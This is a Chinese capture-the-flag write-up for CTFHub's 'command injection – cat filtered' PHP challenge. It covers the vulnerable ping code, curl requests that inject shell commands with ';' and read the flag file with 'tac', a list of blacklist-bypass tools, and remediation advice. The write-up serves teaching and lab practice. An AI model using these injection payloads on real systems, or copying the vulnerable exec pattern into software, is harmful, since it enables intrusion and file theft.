CTFHub - Web - 命令注入-过滤 cat

# CTFHub # Web # RCE # 命令注入 # 黑名单绕过

一、题目信息

  • 题目名称：命令注入-过滤 cat
  • 题目方向：Web - RCE
  • 运行环境：PHP
  • 题目目标：绕过 cat 命令过滤，读取 Web 目录中的动态 Flag 文件。

二、漏洞分析

页面源码暴露了后端逻辑。用户输入的 ip 被直接拼接到 ping 命令中，服务端只使用正则表达式过滤小写字符串 cat：

<?php
$ip = $_GET['ip'];
$m = [];

if (!preg_match_all("/cat/", $ip, $m)) {
    $cmd = "ping -c 4 {$ip}";
    exec($cmd, $res);
} else {
    $res = $m;
}
?>

过滤没有移除命令分隔符，因此 ;、&&、| 等仍可截断原命令。同时，黑名单只检查是否出现连续的 cat，没有限制其他等价文件读取工具，也没有校验输入是否为合法 IP。

常用替代命令包括 tac、nl、grep、sed、head、tail 和 strings。本题使用 tac，它与 cat 输出方向相反但不影响读取单行 Flag。

三、解题步骤

  1. 验证命令执行并列出 Web 目录： 
    curl.exe -sS --get ^
  --data-urlencode "ip=127.0.0.1; pwd; ls -la" ^
  "http://<challenge-host>:10800/"

    响应中出现当前目录和随机命名的 Flag PHP 文件：

    /var/www/html
total 20
drwxr-xr-x    1 www-data www-data      4096 Sep 23 11:18 .
drwxr-xr-x    1 root     root          4096 Jan 30  2020 ..
-rw-r--r--    1 root     root            42 Sep 23 11:18 flag_193511895917731.php
-rw-r--r--    1 root     root           654 Feb 20  2020 index.php

    Flag 文件名由环境动态生成，实际解题时应以目录列表结果为准。

  2. 使用 tac 绕过 cat 过滤： 
    curl.exe -sS --get ^
  --data-urlencode "ip=127.0.0.1; tac /var/www/html/flag_193511895917731.php" ^
  "http://<challenge-host>:10800/"

    命令执行结果被 exec() 收集并通过 print_r() 回显：

    <?php // ctfhub{d99986e65e5c7e67245b4846}

四、最终 Flag

ctfhub{d99986e65e5c7e67245b4846}

五、修复建议

  • 严格校验输入：使用 filter_var($ip, FILTER_VALIDATE_IP) 校验目标地址，拒绝包含分隔符和命令参数的输入。
  • 不要拼接 Shell 命令：优先采用参数分离的执行方式；若确实需要拼接，使用 escapeshellarg() 处理每个参数。
  • 不要依赖关键字黑名单：同类工具和编码方式很多，单靠过滤 cat 无法阻止命令执行或文件读取。
  • 最小化权限：限制 Web 服务账户的权限，并将 Flag 等敏感文件移出 Web 根目录及可读范围。
  • 关闭源码回显：避免在生产或挑战业务页面使用 show_source()、highlight_file() 暴露后端实现。
